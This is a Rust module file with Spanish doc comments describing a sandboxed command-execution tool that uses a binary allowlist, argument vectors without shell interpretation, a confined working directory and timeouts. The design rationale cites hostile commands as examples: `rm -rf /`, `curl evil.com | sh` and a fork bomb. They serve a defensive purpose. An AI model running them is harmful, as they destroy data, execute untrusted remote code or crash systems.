//! Tool de ejecución de comandos validados.
//!
//! **No es una shell libre.** Es un sistema de ejecución con lista
//! blanca de binarios permitidos y validación de argumentos.
//!
//! ## Por qué no shell libre
//!
//! Un shell libre (`sh -c "cualquier cosa"`) es imposible de sandboxear
//! de forma fiable. El usuario podría escribir `rm -rf /`, `curl
//! evil.com | sh`, o `:(){ :|:& };:` (fork bomb). No hay sandbox que
//! aguante.
//!
//! En su lugar:
//! 1. Solo se permiten binarios de una **lista blanca**.
//! 2. Los **argumentos** se pasan como `Vec<String>` (sin shell
//!    interpretation, sin pipes, sin redirecciones).
//! 3. El `cwd` está confinado al sandbox del proyecto.
//! 4. Hay un **timeout** por comando.
//! 5. La salida se captura y se trunca si es enorme.
//!
//! ## Lo que NO hace
//!
//! - No interpreta `|`, `>`, `>>`, `&`, `&&`, `||`, `;`, `$()`.
//! - No expande variables (`$HOME`).
//! - No ejecuta comandos con `sudo`.
//! - No permite binarios fuera de la lista blanca.

pub mod allowlist;
pub mod tool;

pub use allowlist::AllowList;
pub use tool::{ShellResult, ShellTool};
